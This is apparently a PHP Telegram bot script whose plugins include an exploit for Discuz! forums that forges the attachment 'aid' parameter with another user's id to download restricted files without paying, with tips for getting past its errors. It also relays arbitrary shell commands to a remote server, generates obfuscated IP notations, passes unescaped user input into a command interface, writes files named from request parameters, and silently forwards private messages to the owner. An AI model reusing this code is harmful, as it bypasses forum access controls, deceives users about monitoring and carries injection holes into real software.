<?php
//init
require('vendor/autoload.php');
$telegram = new \Zyberspace\Telegram\Cli\Client('unix:///tmp/tg.sck');
function encodeURI($peer){
	return iconv("gb2312", "UTF-8", $peer);
}
function escapeStringArgument($argument)
{
    return '"' . addslashes($argument) . '"';
}
function escape($argument)
{
    return escapeStringArgument(encodeURI($argument));
}
$plugins = [];
if($_GET['from'] != "Dx._Dennx"){
//is group?
	if ($_GET['to'] == 'Dx._Dennx') {
		$isgroup = false;
	}else{
		$isgroup = true;
	}

//reply to...
	if ($isgroup) {
		$from = $_GET['to'];
	}else{
		$from = $_GET['from'];
		$telegram->exec("msg Denny_Dai ".json_encode($_GET)); //私聊监测
	}

//begin!

	#dzdown
	$plugins[] .= "#dzdown Discuz! 免积分下载 [#dzdown <附件URL>]";
	if (preg_match("/^#dzdown (.*)$/", $_GET['text'], $matches)) {
		$url = str_replace("%3D","=",$matches[0]);
		preg_match_all("/(\?|&)aid=([^&?]*)/i",$url,$match0);
		$aid=$match0[2][0];
		$aid = base64_decode($aid);
		preg_match_all("/\|(.*?)\|/i",$aid,$match1);
		if(!empty($_POST['uid'])){
		$uid = '|'.$_POST['uid'].'|';
		}else{
		$uid = '|1|';
		}
		$aid = str_replace($match1[0][1], $uid, $aid);
		$aid = base64_encode($aid);
		$aid = str_replace("=","%3D",$aid);
		preg_match_all("#https?://(.*?)($|/)#m",$url,$match2);
		$url = $match2[0][0].'forum.php?mod=attachment&aid='.$aid;
		$msg = "下载链接:  ".$url;
		$msg .= "\n若提示[抱歉，只有特定用户可以下载本站附件]则该uid没下载权限，可更改uid试试（uid就是用户id）\n若提示[抱歉，该附件无法读取]则证明该uid未打开过该帖，可更改uid试试；或漏洞已修补，无法免积分下载\n若提示[请不要从外部链接下载本站附件]在新打开页面刷新窗口即可";
		$telegram->exec("msg ".$from." ".escape($msg));
	}

	#echo
	$plugins[] .= "#echo 输出 [#echo <text>]";
	if (preg_match("/^#echo (.*)$/", $_GET['text'], $matches)) {
		$telegram->exec("msg ".$from." ".$matches[1]);
	}

	#exec
	//$plugins[] .= "#exec Execute [#exec <cmd>]";
	if (preg_match("/^#exec (.*)$/", $_GET['text'], $matches) and $_GET['from'] == 'Denny_Dai') {
		$msg = file_get_contents("http://1.vps.dennx.com/?exec=".urlencode($matches[1]));
		$telegram->msg($from,$msg);
	}

	#ipto
	$plugins[] .= "#ipto IP变形 [#ip <ip>]";
	if (preg_match("/^#ipto (.*)$/", $_GET['text'], $matches)) {
		$arr = explode('.',$matches[1]);
		$msg = '原IP: '.$arr[0].'.'.$arr[1].'.'.$arr[2].'.'.$arr[3];
		$msg .= "\n整数型: ".($arr[0] * pow(256,3) + $arr[1] * pow(256,2) + $arr[2] * 256 + $arr[3]);
		$msg .= "\n八进制: 0".decoct($arr[0]).".0".decoct($arr[1]).".0".decoct($arr[2]).'.0'.decoct($arr[3]);
		$msg .= "\n十六进制: 0x".dechex($arr[0]).".0x".dechex($arr[1]).".0x".dechex($arr[2]).'.0x'.dechex($arr[3]);
		$msg .= "\n变态十六进制: 0x0000000000".dechex($arr[0]).".0x0000000000".dechex($arr[1]).".0x0000000000".dechex($arr[2]).'.0x0000000000'.dechex($arr[3]);
		$msg .= "\n原ip、八进制、十六进制以及变态十六进制ip可以任意组合，如: 0".decoct($arr[0]).'.0x0000000000'.dechex($arr[1]).'.'.$arr[2].'.0x'.dechex($arr[3]);
		$telegram->exec("msg ".$from." ".escape($msg));
	}

	#trans
	//$plugins[] .= "#trans 翻译 [#trans <target-lang>(两位) <text>]";
	if (preg_match("/^#trans (.*)$/", $_GET['text'], $matches)) {
		$matches = explode(" ", $matches[1], 2);
		if (!isset($matches[1])) {
			$to = "zh";
			$text = $matches[0];
		}else{
			$to = $matches[0];
			$text = $matches[1];
		}
		$trans = file_get_contents("http://tool.dennx.com/translate/?text=".$text."&to=".$to);
		$msg = "翻译结果: ".$trans;
		$telegram->exec("msg ".$from." ".escape($msg));

	}

	#tts
	$plugins[] .= "#tts 文字转语音 [#tts <text>]";
	if (preg_match("/^#tts (.*)$/", $_GET['text'], $matches)) {
		$mp3 = file_get_contents("http://tts.baidu.com/text2audio?lan=zh&ie=UTF-8&text=".$matches[1]);
		$file = fopen($_GET['from'].".mp3","w");
		echo fwrite($file,$mp3);
		fclose($file);
		$telegram->exec("send_audio ".$from." /home/wwwroot/1.vps.dennx.com/".$_GET['from'].".mp3");
		//unlink($matches[1].".mp3");
	}

	#help & plugin List (!at the last of plugins)
	$plugins[] .= "#help 查看帮助 [#help]";
	if (preg_match("/^#help$/", $_GET['text'])) {
		$plugin_list = "欢迎使用来自Dennx.com的TG-BOT";
		foreach ($plugins as $value) {
			$plugin_list .= "\n".$value;
		}
		$telegram->exec("msg ".$from." ".escape($plugin_list));
	}

}